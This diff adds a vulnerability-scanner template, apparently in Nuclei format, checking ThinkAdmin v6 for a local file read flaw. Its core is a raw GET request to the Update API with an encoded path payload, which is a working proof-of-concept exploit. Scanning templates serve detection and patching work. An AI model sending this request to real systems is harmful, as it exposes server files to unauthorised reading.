@@ -1,0 +1,21 @@
+id: poc-yaml-thinkadmin-v6-readfile
+
+info:
+  name: poc-yaml-thinkadmin-v6-readfile
+  author: 0x_zmz(github.com/0x-zmz)
+  severity: high
+  tags: xray-converted,lfi,ct-141160
+  reference:
+    - https://mp.weixin.qq.com/s/3t7r7FCirDEAsXcf2QMomw
+
+http:
+  - raw:
+      - |
+        GET /admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b2x322s2t3c1a342w34 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
